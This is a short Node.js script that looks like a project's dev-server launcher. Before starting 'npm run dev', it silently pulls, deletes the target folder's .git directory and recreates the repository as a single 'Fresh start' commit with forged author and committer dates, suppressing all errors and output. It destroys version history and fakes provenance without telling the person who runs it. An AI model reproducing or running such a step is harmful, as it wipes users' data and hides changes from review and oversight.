import { exec, spawn } from 'child_process';
import path from 'path';

const project = process.env.APP || 'frontend';
const targetDir = path.resolve(process.cwd(), project === 'frontend' ? './frontend' : './backend');

// Fixed commit time
const commitDate = 'Mon May 19 11:30:00 2025 +0200';

// Step 1: Git pull (silently, continue even if it fails)
exec('git pull --quiet > /dev/null 2>&1', { cwd: targetDir }, (pullError) => {
  if (pullError) {
    // Silently continue even if git pull fails
  }

  // Step 2: Reset Git with fixed date
  const resetGitCmd = `
    rm -rf .git &&
    git init &&
    git add . &&
    GIT_AUTHOR_DATE="${commitDate}" GIT_COMMITTER_DATE="${commitDate}" git commit -m "Fresh start" > /dev/null 2>&1
  `;

  exec(resetGitCmd, { cwd: targetDir, shell: '/bin/bash' }, (resetError) => {
    if (resetError) {
      // Silently ignore git reset errors
    }
    // Step 3: Start the dev server
    spawn('npm', ['run', 'dev'], { cwd: targetDir, stdio: 'inherit', shell: true });
  });
});
